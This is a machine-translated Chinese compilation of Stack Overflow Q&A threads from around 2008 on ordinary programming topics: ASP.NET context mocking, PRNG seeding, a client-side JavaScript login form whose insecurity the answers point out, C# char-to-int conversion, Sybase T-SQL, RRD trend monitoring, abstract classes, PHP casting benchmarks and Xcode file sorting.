您可能会发现我写的这篇文章在某种程度上有所帮助 [http://santoshbenjamin.wordpress.com/2008/08/04/mock-httpcontext-and-session-state/](http://santoshbenjamin.wordpress.com/2008/08/04/mock-httpcontext-and-session-state/)

欢呼班吉

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-10-27T09:32:07.580

现在，为了披露，我还没有弄脏你正在使用的大部分东西，但是：

如果你想模拟 IsAuthenticated，为什么不创建一个静态类来返回一个可以被你的测试代码操作的布尔值呢？

这有点粗糙，但希望你能明白：

```
interface IAuthenticationChecker
{
    bool IsAuthenticated { get; }
}

public class MockAuthenticationChecker : IAuthenticationChecker
{
    static bool _authenticated = false;

    public static void SetAuthenticated(bool value)
    {
        _authenticated = value;
    }
    #region IAuthenticationChecker Members

    public bool IsAuthenticated
    {
        get { return _authenticated; }
    }

    #endregion
}

public class RequestAuthenticationChecker : IAuthenticationChecker
{

    #region IAuthenticationChecker Members

    public bool IsAuthenticated
    {
        get {
            if (HttpContext.Current == null)
                throw new ApplicationException(
                    "Unable to Retrieve IsAuthenticated for Request becuse there is no current HttpContext.");

            return HttpContext.Current.Request.IsAuthenticated;
        }
    }

    #endregion
} 
```

然后，您可以在应用程序级别使用对任何一个的引用，是的，这意味着您必须在应用程序级别添加引用，并且您需要使用不同的 ref 而不是 Request，但您还可以完全控制身份验证以进行测试:)

仅供参考 - 这完全可以被炸开，我在大约一分钟内把它放在一起:)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2011-09-21T12:51:30.297

这是一种伪造上下文的简单方法，从[Jeff 的博客](http://weblogs.asp.net/jeff/archive/2004/05/31/145111.aspx)中找到：

```
 TextWriter tw = new StringWriter();
        HttpWorkerRequest wr = new SimpleWorkerRequest("/webapp", "c:\\inetpub\\wwwroot\\webapp\\", "default.aspx", "", tw);
        HttpContext.Current = new HttpContext(wr); 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-06-27T13:52:31.303

这是一个可能有用的类。它处理 ajax 请求、用户身份验证、请求参数等：[https ://gist.github.com/3004119](https://gist.github.com/3004119)

# algorithm - 具有相同输出的伪随机发生器

> ID：239063
> 
> 赞同：4
> 
> 时间：2008-10-27T04:13:30.530
> 
> 标签：algorithm, security, random, protocols

[我在http://auto.howstuffworks.com/remote-entry2.htm](http://auto.howstuffworks.com/remote-entry2.htm)看到一篇关于汽车远程进入系统的文章。在第三个项目符号中，作者说，

> 发射器和接收器都使用相同的伪随机数发生器。当发送器发送一个 40 位代码时，它会使用伪随机数生成器选择一个新代码，并将其存储在内存中。另一方面，当接收器接收到有效代码时，它会使用相同的伪随机数生成器来选择一个新代码。这样，发射器和接收器就同步了。接收器只有在收到它期望的代码时才会打开门。

是否可以让两个 PRNG 函数同时产生相同的随机数？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2008-10-27T04:16:15.813

在 PRNG 函数中，函数的输出取决于“种子”值，因此在给定相同种子值的情况下，连续调用将提供相同的输出。所以，是的。

一个示例（使用 C#）将类似于：

```
// Provide the same seed value for both generators:
System.Random r1 = new System.Random(1);
System.Random r2 = new System.Random(1);

// Will output 'True'
Console.WriteLine(r1.Next() == r2.Next()); 
```

这当然取决于随机数生成器使用某种确定性公式来生成其值。如果您使用所谓的“真正随机”数生成器，它在生成过程中使用熵或噪声的属性，那么在给定一些输入的情况下很难生成相同的值，除非您能够复制熵状态两个调用函数 - 当然，这会破坏使用这种生成器的目的......

在远程无钥匙进入系统的情况下，他们很可能使用确定性的 PRNG 功能来利用此功能。有许多 IC 提供这种功能来为电子电路生成随机数。

编辑：根据要求，这是一个不依赖于指定种子值的非确定性随机数生成器的示例：[Quantum Random Number Generator](http://qrbg.irb.hr/)。当然，正如 freespace 在评论中指出的那样，这不是一个伪随机数生成器，因为它生成的是真正的随机数。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2008-10-27T04:27:48.537

大多数 PRNG 都有一个以**种子**形式存在的内部状态，它们用于生成下一个值。内部逻辑是这样的：

```
nextNumber = function(seed);
seed = nextNumber; 
```

因此，每次生成新数字时，都会更新种子。如果您给两个使用相同算法的 PRNG 提供相同的种子，`function(seed)`则将评估为相同的数字（假设它们是确定性的，大多数都是）。

直接应用于您的问题：发射器选择一个代码，并将其用作种子。接收者在接收到它之后，使用它来播种它的生成器。现在两者对齐，它们将生成相同的值。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-10-27T04:51:26.507

正如 Erik 和 Claudiu 所说，只要您使用相同的值播种 PRNG，您最终会得到相同的输出。

使用 AES（或任何其他加密算法）作为 PRNG 的基础时可以看到一个示例。只要您继续使用在两个设备（发射器和接收器）上匹配的输入，那么输出也将匹配。

# javascript - 用户按 Enter 时未提交 Javascript 登录表单

> ID：239082
> 
> 赞同：12
> 
> 时间：2008-10-27T04:33:01.630
> 
> 标签：javascript, forms, button, submit, html-input

我正在为一个网站做一个简单的 javascript 登录，并想出了这个：

```
<form id="loginwindow">
<strong>Login to view!</strong>
<p><strong>User ID:</strong>
  <input type="text" name="text2">
</p>
<p><strong>Password:</strong>
<input type="password" name="text1"><br>
  <input type="button" value="Check In" name="Submit" onclick=javascript:validate(text2.value,"username",text1.value,"password") />
</p>

</form>
<script language = "javascript">

function validate(text1,text2,text3,text4)
{
 if (text1==text2 && text3==text4)
 load('album.html');
 else 
 {
  load('failure.html');
 }
}
function load(url)
{
 location.href=url;
}
</script> 
```

...除了一件事外，它可以工作：按 Enter 提交表单不会做任何事情。我有一种感觉，这是因为我使用了“onclick”，但我不确定用什么来代替。想法？

* * *

好的，是的，所以我很清楚这在安全方面是多么脆弱。这不是什么特别绝密的事情，所以这不是一个大问题，但是如果你们可以用代码详细说明你们的想法，我很想看看你们的想法。我列出的代码实际上就是我目前正在使用的所有代码，因此如果需要，我可以从头开始。

* * *

## 回答 #1

> 赞同：33
> 
> 时间：2008-10-27T04:35:37.930

这里同时讨论了几个主题。让我们试着澄清一下。

**1\. 您最关心的问题：**

（*为什么按ENTER时输入按钮不起作用？*）

使用**提交**按钮类型。

```
<input type="submit".../> 
```

..代替

```
<input type="button".../> 
```

**您的问题与使用onclick**属性没有任何关系。相反，您没有得到您想要的行为，因为您使用了**按钮**输入类型，它的行为方式与提交按钮的行为方式不同。

在 HTML 和 XHTML 中，某些元素有默认行为。表单上的输入按钮通常属于“提交”类型。**在大多数浏览器中，默认情况下，当从同一表单元素中**的焦点元素按下 ENTER 时，会**触发**“提交”按钮。“按钮”输入类型没有。如果您想利用该默认行为，可以将输入类型更改为“提交”。

 **例如：

```
<form action="/post.php" method="post">
    <!-- 
    ...
    -->
    <input type="submit" value="go"/>
</form> 
```

**2\. 安全问题：**

*@Ady*提到了一个安全问题。**在 javascript 中进行登录有一大堆**安全问题。这些可能超出了**这个问题的范围**，特别是因为您已经表示您并不特别担心它，并且您的登录方法实际上只是将 location.href 设置为新的 html 页面（表明您可能没有任何真正的安全机制）。

如果有人直接对这些问题感兴趣，这里是关于 SO**相关主题的链接，而不是繁琐的。**

*   [**有什么方法可以在客户端进行用户验证吗？**](https://stackoverflow.com/questions/32710/is-there-some-way-i-can-validate-a-user-in-client-side)
*   [**加密 Ajax 调用以在 jQuery 中进行身份验证**](https://stackoverflow.com/questions/148068/is-encrypting-ajax-calls-for-authentication-possible-with-jquery)

**3\. 其他问题：**

这是您的代码的**快速清理**，它仅遵循一些最佳实践。它没有解决人们提到的安全问题。相反，我包含它只是为了**说明一些健康的习惯**。如果您对我为什么以某种方式写东西有具体问题，请随时提问。此外，**浏览相关主题的堆栈**（因为您的问题可能已经在这里讨论过）。

主要需要注意的是从 HTML 中**删除了事件属性**（onclick=""、onsubmit="" 或 onkeypress=""）。这些属于 javascript，并且将 javascript 事件排除在标记之外被认为是最佳实践。

```
<form action="#" method="post" id="loginwindow">
    <h3>Login to view!</h3>
    <label>User ID: <input type="text" id="userid"></label>
    <label>Password: <input type="password" id="pass"></label>
    <input type="submit" value="Check In" />
</form>

<script type="text/javascript">
window.onload = function () {
    var loginForm = document.getElementById('loginwindow');
    if ( loginwindow ) {
        loginwindow.onsubmit = function () {

            var userid = document.getElementById('userid');
            var pass = document.getElementById('pass');

            // Make sure javascript found the nodes:
            if (!userid || !pass ) {
                return false;
            }

            // Actually check values, however you'd like this to be done:
            if (pass.value !== "secret")  {
                location.href = 'failure.html';
            }

            location.href = 'album.html';
            return false;
        };
    }
};
</script> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-10-27T04:39:45.487

代替 <input type="button">，使用 <input type="submit">。您可以将验证代码放在表单 onsubmit 处理程序中：

<form id="loginwindow" onsubmit="validate(...)">

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-10-27T04:44:42.153

这是因为它不是表单提交，所以当用户按下回车时不会触发任何事件。上述表单提交选项的替代方法是为输入表单添加一个事件侦听器，以检测用户是否按下回车。

```
<input type="password" name="text1" onkeypress="detectKey(event)"> 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2017-05-15T12:22:15.623

将脚本直接放在您的 html 文档中。使用您要使用的功能更改 onclick 值。html 中的脚本将告诉表单在用户点击回车或按下提交按钮时提交。

```
 <form id="Form-v2" action="#">

<input type="text" name="search_field"  placeholder="Enter a movie" value="" 
id="search_field" title="Enter a movie here" class="blink search-field"  />
<input type="submit" onclick="" value="GO!" class="search-button" />        
 </form>

    <script>
    //submit the form
    $( "#Form-v2" ).submit(function( event ) {
      event.preventDefault();
    });
         </script> 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-10-27T04:35:14.590

我的想法 = 巨大的安全漏洞。任何人都可以查看用户名和密码。

与您的问题更相关：-您发生了两个事件。

1.  用户点击按钮。
2.  用户按下回车。

enter 键提交表单，但不单击按钮。

通过将代码放在表单的 onsubmit 方法中，代码将在表单提交时运行。通过更改要提交的按钮的输入类型，按钮将以与输入按钮相同的方式提交表单。

然后，您的代码将为这两个事件运行。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2008-10-27T04:40:39.680

也许你可以试试这个：

```
<form id="loginwindow" onsubmit='validate(text2.value,"username",text1.value,"password")'>
<strong>Login to view!</strong>
<p><strong>User ID:</strong>
   <input type="text" name="text2">
</p>
<p><strong>Password:</strong>
<input type="password" name="text1"><br>
   <input type="submit" value="Check In"/>
</p>

</form> 
```

正如其他人指出的那样，您的解决方案还有其他问题。但这应该回答你的问题。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2008-10-27T04:49:27.323

当然这太不安全了，因为每个人都可以在一秒钟内破解它......

-- 只有伪安全的方式来做 js-logins 是这样的：

```
<form action="http://www.mySite.com/" method="post" onsubmit="this.action+=this.theName.value+this.thePassword.value;">
  Name: <input type="text" name="theName"><br>
  Password: <input type="password" name="thePassword"><br>
  <input type="submit" value="Login now">
</form> 
```

# c# - 在 C# 中将 char 转换为 int

> ID：239103
> 
> 赞同：194
> 
> 时间：2008-10-27T04:49:21.707
> 
> 标签：c#, char, int

我在 c# 中有一个字符：

```
char foo = '2'; 
```

现在我想把 2 变成一个 int。我发现 Convert.ToInt32 返回 char 的实际十进制值，而不是数字 2。以下将起作用：

```
int bar = Convert.ToInt32(new string(foo, 1)); 
```

int.parse 也仅适用于字符串。

C# 中是否没有本机函数可以从 char 到 int 而不使其成为字符串？我知道这是微不足道的，但似乎很奇怪，没有任何原生的东西可以直接进行转换。

* * *

## 回答 #1

> 赞同：214
> 
> 时间：2008-10-27T04:51:26.540

这会将其转换为`int`：

```
char foo = '2';
int bar = foo - '0'; 
```

这是有效的，因为每个字符在内部都由一个数字表示。`'0'`要的字符`'9'`由连续的数字表示，因此找到字符之间的差异`'0'`并`'2'`得到数字 2。

* * *

## 回答 #2

> 赞同：188
> 
> 时间：2009-04-28T02:20:19.333

有趣的答案，但文档的说法不同：

> 使用这些`GetNumericValue`方法将`Char`表示数字的对象转换为数值类型。使用 `Parse`and`TryParse`将字符串中的字符转换为`Char` 对象。用于`ToString`将`Char` 对象转换为`String`对象。

[http://msdn.microsoft.com/en-us/library/system.char.aspx](http://msdn.microsoft.com/en-us/library/system.char.aspx)

* * *

## 回答 #3

> 赞同：98
> 
> 时间：2008-10-27T05:39:56.987

有没有人考虑过使用`int.Parse()`并`int.TryParse()`喜欢这个

```
int bar = int.Parse(foo.ToString()); 
```

像这样更好

```
int bar;
if (!int.TryParse(foo.ToString(), out bar))
{
    //Do something to correct the problem
} 
```

它更安全，更不容易出错

* * *

## 回答 #4

> 赞同：28
> 
> 时间：2008-10-27T04:52:06.320

```
char c = '1';
int i = (int)(c - '0'); 
```

您可以从中创建一个静态方法：

```
static int ToInt(this char c)
{
    return (int)(c - '0');
} 
```

* * *

## 回答 #5

> 赞同：16
> 
> 时间：2011-12-30T07:03:56.050

试试这个

```
char x = '9'; // '9' = ASCII 57

int b = x - '0'; //That is '9' - '0' = 57 - 48 = 9 
```

* * *

## 回答 #6

> 赞同：9
> 
> 时间：2012-10-26T06:59:21.217

默认情况下你使用UNICODE所以我建议使用faulty的方法

`int bar = int.Parse(foo.ToString());`

即使数字和基本拉丁字符下的数值相同。

* * *

## 回答 #7

> 赞同：8
> 
> 时间：2015-04-18T02:32:38.250

这将转换为整数并处理 unicode

`CharUnicodeInfo.GetDecimalDigitValue('2')`

[你可以在这里](https://msdn.microsoft.com/en-us/library/vstudio/fw9t1kbk(v=vs.100).aspx)阅读更多。

* * *

## 回答 #8

> 赞同：6
> 
> 时间：2017-12-26T08:36:05.003

**原则：**

```
char foo = '2';
int bar = foo & 15; 
```

ASCII 字符 0-9 的二进制是：

```
0   -   0011 0000
1   -   0011 0001
2   -   0011 0010
3   -   0011 0011
4   -   0011 0100
5   -   0011 0101
6   -   0011 0110
7   -   0011 0111
8   -   0011 1000
9   -   0011 1001 
```

如果你把它们中的每一个都取进去前 4 个 LSB（使用按位与 8'b00001111 等于 15）你会得到实际数字（0000 = 0,0001=1,0010=2,...）

**用法：**

```
public static int CharToInt(char c)
{
    return 0b0000_1111 & (byte) c;
} 
```

* * *

## 回答 #9

> 赞同：6
> 
> 时间：2018-04-12T18:08:21.907

真正的方法是：

> int theNameOfYourInt = (int).Char.GetNumericValue(theNameOfYourChar);

"theNameOfYourInt" - 您希望将 char 转换为的 int。

"theNameOfYourChar" - 您要使用的 Char，以便将其转换为 int。

让其他一切保持不变。

* * *

## 回答 #10

> 赞同：6
> 
> 时间：2019-06-17T15:04:14.853

我同意@Chad Grant

同样正确的是，如果您转换为字符串，那么您可以将该值用作问题中所述的数字

```
int bar = Convert.ToInt32(new string(foo, 1)); // => gives bar=2 
```

我试图创建一个更简单易懂的例子

```
char v = '1';
int vv = (int)char.GetNumericValue(v); 
```

char.GetNumericValue(v) 以 double 形式返回并转换为 (int)

作为数组的更多高级用法

```
int[] values = "41234".ToArray().Select(c=> (int)char.GetNumericValue(c)).ToArray(); 
```

* * *

## 回答 #11

> 赞同：2
> 
> 时间：2015-08-13T06:42:52.580

我正在使用 Compact Framework 3.5，并且没有“char.Parse”方法。我认为使用 Convert 类还不错。（通过 C# 参见 CLR，Jeffrey Richter）

```
char letterA = Convert.ToChar(65);
Console.WriteLine(letterA);
letterA = 'あ';
ushort valueA = Convert.ToUInt16(letterA);
Console.WriteLine(valueA);
char japaneseA = Convert.ToChar(valueA);
Console.WriteLine(japaneseA); 
```

适用于 ASCII 字符或 Unicode 字符

* * *

## 回答 #12

> 赞同：2
> 
> 时间：2017-01-14T21:54:30.860

根据字符不是ASCII数字时的结果比较一些方法：

```
char c1 = (char)('0' - 1), c2 = (char)('9' + 1); 

Debug.Print($"{c1 & 15}, {c2 & 15}");                                   // 15, 10
Debug.Print($"{c1 ^ '0'}, {c2 ^ '0'}");                                 // 31, 10
Debug.Print($"{c1 - '0'}, {c2 - '0'}");                                 // -1, 10
Debug.Print($"{(uint)c1 - '0'}, {(uint)c2 - '0'}");                     // 4294967295, 10
Debug.Print($"{char.GetNumericValue(c1)}, {char.GetNumericValue(c2)}"); // -1, -1 
```

* * *

## 回答 #13

> 赞同：1
> 
> 时间：2021-06-09T17:10:38.543

首先将字符转换为字符串，然后再转换为整数。

```
var character = '1';
var integerValue = int.Parse(character.ToString()); 
```

* * *

## 回答 #14

> 赞同：0
> 
> 时间：2021-06-13T06:16:22.257

用这个：

```
public static string NormalizeNumbers(this string text)
{
    if (string.IsNullOrWhiteSpace(text)) return text;

    string normalized = text;

    char[] allNumbers = text.Where(char.IsNumber).Distinct().ToArray();

    foreach (char ch in allNumbers)
    {
        char equalNumber = char.Parse(char.GetNumericValue(ch).ToString("N0"));
        normalized = normalized.Replace(ch, equalNumber);
    }

    return normalized;
} 
```

* * *

## 回答 #15

> 赞同：0
> 
> 时间：2021-08-10T19:41:30.190

将字符 0-9 转换为整数的一种非常快速简单的方法：C# 将 char 值视为整数。

字符 c = '7'; (ascii 码 55) int x = c - 48; （结果 = 7 的整数）

* * *

## 回答 #16

> 赞同：0
> 
> 时间：2021-09-07T13:49:04.807

使用[Uri.FromHex](https://docs.microsoft.com/de-de/dotnet/api/system.uri.fromhex?view=net-5.0)。
并避免异常[Uri.IsHexDigit](https://docs.microsoft.com/de-de/dotnet/api/system.uri.ishexdigit?view=net-5.0)。

```
char testChar = 'e';
int result = Uri.IsHexDigit(testChar) 
               ? Uri.FromHex(testChar)
               : -1; 
```

* * *

## 回答 #17

> 赞同：-1
> 
> 时间：2013-08-26T02:07:29.473

这对我有用：

```
int bar = int.Parse("" + foo); 
```

* * *

## 回答 #18

> 赞同：-4
> 
> 时间：2017-05-29T18:22:34.850

我看过很多答案，但他们似乎让我感到困惑。我们不能只是简单地使用类型转换。

例如：-

```
int s;
char i= '2';
s = (int) i; 
```

# tsql - 如何在 T-SQL 中将变量赋值与数据检索操作结合起来

> ID：239122
> 
> 赞同：1
> 
> 时间：2008-10-27T05:02:38.687
> 
> 标签：tsql, variable-assignment, sap-ase, data-retrieval, derived-table

澄清一下，我正在运行 Sybase 12.5.3，但我相信这也适用于 SQL Server 2005。基本上，我正在尝试编写一个看起来有点像这样的查询，我已经尽可能地简化它以突出问题：

```
DECLARE @a int,  @b int, @c int

SELECT
     @a = huzzah.a
    ,@b = huzzah.b
    ,@c = huzzah.c
FROM (
    SELECT
         1 a
        ,2 b
        ,3 c
) huzzah 
```

此查询给我以下错误：*“错误：141 为变量赋值的 SELECT 语句不得与数据检索操作结合使用。”*

到目前为止，我唯一的解决方法是将派生表数据插入到一个临时表中，然后再次选择它。效果很好，但是这不起作用的事实让我很恼火。有一个更好的方法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-10-29T22:09:09.843

该错误确实如 12.5.3 esd 4 和 7 中所述出现，它在 12.5.4 esd 4 和 6 中运行良好。

看起来像一个已修补的错误，您唯一的选择似乎是解决方法或修补程序。

发现似乎是[错误 377625](http://search.sybase.com/kbx/changerequests?bug_id=377625)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-10-27T09:27:26.967

我刚刚针对 12.5.3 运行了你的代码，它解析得很好……不返回任何东西，但它确实运行了。您是否可能过于简化了问题，因为我根本没有看到任何错误消息。

为了清楚起见，以下运行并返回您所期望的。

```
DECLARE @a int,  @b int, @c int

SELECT
     @a = huzzah.a
    ,@b = huzzah.b
    ,@c = huzzah.c
FROM (
    SELECT
         1 a
        ,2 b
        ,3 c
) huzzah

select @a
select @b
select @c 
```

# monitoring - 跟踪/监控突然的趋势变化

> ID：239126
> 
> 赞同：0
> 
> 时间：2008-10-27T05:08:28.347
> 
> 标签：monitoring, rrd

我使用 RRD 跟踪了很多事情，例如正常运行时间、网络吞吐量等。当您可以将所有图表放在单个页面上时，这很有效，但是，一旦您超出页面，就很难使用图表来捕获问题，您需要查看它们以查看是否存在问题，如果有数百或数千个图表，这显然是不可能的。

那么，是否有任何标准方法或现有软件来监控 rrd 数据库的趋势变化？例如，每天，网络流量看起来几乎相同，如果与正常情况相比，它在一个小时/天/周内急剧上升或下降，我希望得到提醒。

甚至只是寻找趋势变化的通用方法。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-10-27T05:21:02.173

您可以直接读取 RRD 文件，而不仅仅是使用生成的图表。您可能需要编写自己的应用程序来执行此操作，但文件格式是一个开放标准，因此获得所需内容应该不难。

[RRD 文件格式](http://oss.oetiker.ch/rrdtool-trac/browser/branches/1.3/program/src/rrd_format.h)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-10-27T05:37:46.930

看起来RRD实际上支持这个，

[http://cricket.sourceforge.net/aberrant/rrd_hw.htm](http://cricket.sourceforge.net/aberrant/rrd_hw.htm)

有兴趣听听是否有人使用过这个。

# c# - 抽象类的准确使用

> ID：239127
> 
> 赞同：18
> 
> 时间：2008-10-27T05:11:13.643
> 
> 标签：c#, abstract-class

抽象类的确切用途是什么？普通类不能像抽象类那样做同样的事情吗？

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2008-10-27T05:21:44.373

使用抽象类来提供一些具体的实现，但不允许实例化。你总是可以实例化一个普通的类，如果它不能独立存在就没有意义。同时，如果有一个在所有实现类中都相同的具体实现，那么一个接口可能还不够。一个抽象类就足够了。

*   接口：只有契约，没有实现，没有实例化
*   抽象类：契约，一些实现，没有实例化
*   类：契约、实现、实例化

* * *

## 回答 #2

> 赞同：19
> 
> 时间：2008-10-27T05:19:00.587

当您有一些希望子类继承的基本功能时使用抽象类，但实例化基类没有意义。例如，如果你有类似 Shape 基类的东西，你可以有一些可以被子类使用的内置实现以及你希望子类实现的接口方法。但是，创建 Shape 对象可能没有意义。抽象类为您提供了此功能。另一个使用抽象类的好例子是[抽象工厂模式](http://en.wikipedia.org/wiki/Abstract_factory_pattern)。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2008-10-27T11:43:34.257

常规类要求您提供所有方法的实现。
接口要求您*不要*为所有方法提供任何实现。

抽象类是唯一允许您同时拥有包含实现的方法和不提供实现但需要继承类来提供实现的方法的类类型。

允许您在没有实现的情况下添加方法的事实是您无法实例化抽象类的原因：您只能实例化具有其所有方法的实现的东西。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-10-27T05:36:19.117

与常规类不同，`abstract`类可以包含`abstract`方法。它们的行为很像接口成员。

同时，它们几乎可以做常规类可以做的所有其他事情：它们可以实现方法、包含字段和嵌套类型、从另一个类派生等。

# php - 在 PHP 中将字符串转换为整数的最快方法

> ID：239136
> 
> 赞同：258
> 
> 时间：2008-10-27T05:18:57.403
> 
> 标签：php, optimization, casting

`"123"`使用 PHP，将这样的字符串转换为整数的最快方法是什么？

为什么这种特定方法最快？如果它得到意外的输入，比如`"hello"`数组，会发生什么？

* * *

## 回答 #1

> 赞同：375
> 
> 时间：2008-10-27T05:51:01.287

我刚刚建立了一个快速的基准测试练习：

```
Function             time to run 1 million iterations
--------------------------------------------
(int) "123":                0.55029
intval("123"):              1.0115  (183%)

(int) "0":                  0.42461
intval("0"):                0.95683 (225%)

(int) int:                  0.1502
intval(int):                0.65716 (438%)

(int) array("a", "b"):      0.91264
intval(array("a", "b")):    1.47681 (162%)

(int) "hello":              0.42208
intval("hello"):            0.93678 (222%) 
```

平均而言，调用 intval() 会慢两倍半，如果您的输入已经是整数，则差异最大。

我很想知道*为什么*。

* * *

更新：我再次运行测试，这次是强制`(0 + $var)`

```
| INPUT ($x)      |  (int) $x  |intval($x) |  0 + $x   |
|-----------------|------------|-----------|-----------|
| "123"           |   0.51541  |  0.96924  |  0.33828  |
| "0"             |   0.42723  |  0.97418  |  0.31353  |
| 123             |   0.15011  |  0.61690  |  0.15452  |
| array("a", "b") |   0.8893   |  1.45109  |  err!     |
| "hello"         |   0.42618  |  0.88803  |  0.1691   |
|-----------------|------------|-----------|-----------| 
```

**附录：**我刚刚遇到了一个稍微出乎意料的行为，您在选择其中一种方法时应该注意：

```
$x = "11";
(int) $x;      // int(11)
intval($x);    // int(11)
$x + 0;        // int(11)

$x = "0x11";
(int) $x;      // int(0)
intval($x);    // int(0)
$x + 0;        // int(17) !

$x = "011";
(int) $x;      // int(11)
intval($x);    // int(11)
$x + 0;        // int(11) (not 9) 
```

[使用 PHP 5.3.1 测试]

* * *

## 回答 #2

> 赞同：35
> 
> 时间：2008-10-27T07:50:01.657

我个人觉得选角是最漂亮的。

```
$iSomeVar = (int) $sSomeOtherVar; 
```

如果发送像“Hello”这样的字符串，它将被转换为整数 0。对于像“22 岁”这样的字符串，它将被转换为整数 22。任何它无法解析为数字的东西都会变成 0。

如果你真的需要速度，我想这里的其他建议是正确的，假设强制是最快的。

* * *

## 回答 #3

> 赞同：15
> 
> 时间：2008-10-27T05:51:33.390

运行测试。

```
 string coerce:          7.42296099663
   string cast:            8.05654597282
   string fail coerce:     7.14159703255
   string fail cast:       7.87444186211 
```

这是一个测试，每个场景运行 10,000,000 次。:-)

强制是`0 + "123"`

铸造是`(integer)"123"`

我认为 Co-ercion 稍微快一点。哦，尝试`0 + array('123')`是 PHP 中的一个致命错误。您可能希望您的代码检查所提供值的类型。

我的测试代码如下。

* * *

```
function test_string_coerce($s) {
    return 0 + $s;
}

function test_string_cast($s) {
    return (integer)$s;
}

$iter = 10000000;

print "-- running each text $iter times.\n";

// string co-erce
$string_coerce = new Timer;
$string_coerce->Start();

print "String Coerce test\n";
for( $i = 0; $i < $iter ; $i++ ) {
    test_string_coerce('123');
}

$string_coerce->Stop();

// string cast
$string_cast = new Timer;
$string_cast->Start();

print "String Cast test\n";
for( $i = 0; $i < $iter ; $i++ ) {
    test_string_cast('123');
}

$string_cast->Stop();

// string co-erce fail.
$string_coerce_fail = new Timer;
$string_coerce_fail->Start();

print "String Coerce fail test\n";
for( $i = 0; $i < $iter ; $i++ ) {
    test_string_coerce('hello');
}

$string_coerce_fail->Stop();

// string cast fail
$string_cast_fail = new Timer;
$string_cast_fail->Start();

print "String Cast fail test\n";
for( $i = 0; $i < $iter ; $i++ ) {
    test_string_cast('hello');
}

$string_cast_fail->Stop();

// -----------------
print "\n";
print "string coerce:          ".$string_coerce->Elapsed()."\n";
print "string cast:            ".$string_cast->Elapsed()."\n";
print "string fail coerce:     ".$string_coerce_fail->Elapsed()."\n";
print "string fail cast:       ".$string_cast_fail->Elapsed()."\n";

class Timer {
    var $ticking = null;
    var $started_at = false;
    var $elapsed = 0;

    function Timer() {
        $this->ticking = null;
    }

    function Start() {
        $this->ticking = true;
        $this->started_at = microtime(TRUE);
    }

    function Stop() {
        if( $this->ticking )
            $this->elapsed = microtime(TRUE) - $this->started_at;
        $this->ticking = false;
    }

    function Elapsed() {
        switch( $this->ticking ) {
            case true: return "Still Running";
            case false: return $this->elapsed;
            case null: return "Not Started";
        }
    }
} 
```

* * *

## 回答 #4

> 赞同：12
> 
> 时间：2014-04-28T13:43:48.627

您可以使用 FLOAT 简单地将长字符串转换为整数

`$float = (float)$num;`

或者如果你想要整数而不是浮动 val 然后去

`$float = (int)$num;`

例如。

```
(int)   "1212.3"   = 1212 
(float) "1212.3"   = 1212.3 
```

* * *

## 回答 #5

> 赞同：7
> 
> 时间：2012-04-03T14:50:37.073

```
$int = settype("100", "integer"); //convert the numeric string to int 
```

* * *

## 回答 #6

> 赞同：7
> 
> 时间：2014-07-02T05:14:13.500

从任何字符串中提取整数

$in = 'tel.123-12-33';

```
preg_match_all('!\d+!', $in, $matches);
$out =  (int)implode('', $matches[0]); 
```

//$out ='1231233';

* * *

## 回答 #7

> 赞同：4
> 
> 时间：2014-05-30T07:38:37.453

更多临时基准测试结果：

```
$ time php -r 'for ($x = 0;$x < 999999999; $x++){$i = (integer) "-11";}'     

real    2m10.397s
user    2m10.220s
sys     0m0.025s

$ time php -r 'for ($x = 0;$x < 999999999; $x++){$i += "-11";}'              

real    2m1.724s
user    2m1.635s
sys     0m0.009s

$ time php -r 'for ($x = 0;$x < 999999999; $x++){$i = + "-11";}'             

real    1m21.000s
user    1m20.964s
sys     0m0.007s 
```

* * *

## 回答 #8

> 赞同：4
> 
> 时间：2014-09-10T11:31:02.900

跑了一个基准测试，结果是获得一个*实*整数的最快方法（使用所有可用的方法）是

```
$foo = (int)+"12.345"; 
```

只是使用

```
$foo = +"12.345"; 
```

返回一个浮点数。

# xcode - 在 Xcode 中排序文件列表？

> ID：239139
> 
> 赞同：37
> 
> 时间：2008-10-27T05:20:29.820
> 
> 标签：xcode

*Xcode*中有没有办法按字母顺序对Classes文件夹下的文件列表进行排序？

我知道我可以把它们拖来拖去，但是有大量文件很痛苦。

我很惊讶我不能右键单击文件夹并说要排序。

* * *

## 回答 #1

> 赞同：40
> 
> 时间：2008-10-27T06:05:31.337

单击文件夹，然后单击编辑 > 排序 > 按名称

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2011-04-03T12:33:13.400

这是一个 Ruby 脚本，它将在 Xcode 4 项目文件中对各自组中的所有文件进行排序（可能也是 Xcode 3，但我还没有尝试过）。

用法：

```
ruby sort.rb <infile> <outfile> 
```

其中 <infile> 是未排序的 .pbxproj 文件，而 <output> 将是排序后的版本。不要让它们成为同一个文件。

```
#!/usr/bin/env ruby

state = :primary
group = []
file_count = group_count = 0

File.open ARGV[0] do |infile|
  File.open ARGV[1], 'w' do |outfile|
    infile.each_line do |line|
      case state

      when :primary
        # copy lines until and including "children = ("
        outfile.write line
        state = :group if line =~ /^\s*children\s*=\s*\x28\s*$/

      when :group
        if line =~ /^\s*[0-9A-F]+\s*\/\* (.*) \*\/,\s*$/
          # add file to current group if "<guid> /* <filename> */,"
          group << [$1,line]
          file_count += 1

        else
          # otherwise, output sorted files,
          # empty the group, and go back to primary state
          group.sort.each do |fn,ln|
            outfile.write ln
          end

          state = :primary
          group = []
          outfile.write line
          group_count += 1
        end

      end
    end
  end
end

puts "Sorted #{file_count} files in #{group_count} groups" 
```

* * *

## 回答 #3

> 赞同：0
> 
